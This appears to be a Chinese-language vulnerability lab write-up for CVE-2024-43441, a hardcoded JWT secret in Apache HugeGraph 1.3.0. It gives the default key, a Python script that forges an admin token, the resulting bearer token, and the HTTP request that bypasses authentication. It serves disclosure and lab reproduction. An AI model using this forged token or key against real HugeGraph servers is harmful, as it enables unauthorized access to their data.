# Apache HugeGraph JWT Token硬编码导致权限绕过（CVE-2024-43441）

Apache HugeGraph 是一款快速、高度可扩展的图数据库。它提供了完整的图数据库功能，具有出色的性能和企业级的可靠性。

Apache HugeGraph 存在一个 JWT token 密钥硬编码漏洞。当启用了认证但未配置 `auth.token_secret` 时，HugeGraph 将使用一个硬编码的默认 JWT 密钥，其值为 `FXQXbJtbCLxODc6tGci732pkH1cyf8Qg`。攻击者可以使用这个默认密钥生成有效的 JWT token，从而绕过认证执行未经授权的操作。

参考链接：

- <https://github.com/advisories/GHSA-f697-gm3h-xrf9>
- <https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246>

## 环境搭建

执行如下命令启动 Apache HugeGraph 1.3.0 服务器：

```
docker compose up -d
```

服务启动后，可以通过 `http://your-ip:8080` 访问 HugeGraph 的 RESTful API。

默认情况下，Apache HugeGraph 支持两种认证模式：HTTP基础认证和JWT认证。当启动 docker 容器时，系统会使用环境变量 PASSWORD 中指定的值作为默认管理员的密码。在正常情况下，您可以使用用户名 "admin" 和该密码通过 HTTP 基础认证访问 API。

如果您尝试在不提供任何认证头的情况下访问 API，将会收到如下错误：

```json
{
    "exception": "class jakarta.ws.rs.NotAuthorizedException",
    "message": "Authentication credentials are required",
    "cause": ""
}
```

## 漏洞复现

除了默认管理员密码外，我们还可以使用默认 JWT 密钥生成有效的 JWT token 绕过认证。

生成一个使用默认密钥的 JWT token：

```python
# 安装 jwt 库，运行 `pip install pyjwt`
import jwt

# 使用默认密钥生成 JWT token
token = jwt.encode(
    {
      "user_name": "admin",
      "user_id": "-30:admin",
      "exp": 9739523483
    },
    "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg",
    algorithm="HS256"
)
print(f"Generated JWT token: {token}")
# Output:
# Generated JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg
```

使用生成的 token 访问受保护的端点：

```
GET /graphs HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg
```

您将收到如下响应：

![](1.png)

如果您移除 `Authorization` 头，您将收到如下错误：

![](2.png)
